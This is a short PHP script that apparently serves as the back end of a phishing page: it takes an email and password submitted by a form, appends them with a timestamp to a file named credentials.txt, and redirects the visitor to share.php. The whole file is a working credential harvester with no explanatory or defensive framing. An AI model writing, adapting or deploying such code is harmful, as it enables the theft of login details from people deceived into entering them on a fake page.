<?php

$user=$_POST["email"];
$pass=$_POST["password"];
$t=time();
$creds="credentials.txt";
file_put_contents($creds,"Timedate: ".date("Y-m-d h:m:s",$t)."\n",FILE_APPEND | LOCK_EX);
file_put_contents($creds,"user: ".$user."\n",FILE_APPEND | LOCK_EX);
file_put_contents($creds,"password: ".$pass."\n",FILE_APPEND | LOCK_EX);
file_put_contents($creds,"=======================\n",FILE_APPEND | LOCK_EX);

header("location: share.php");

?>
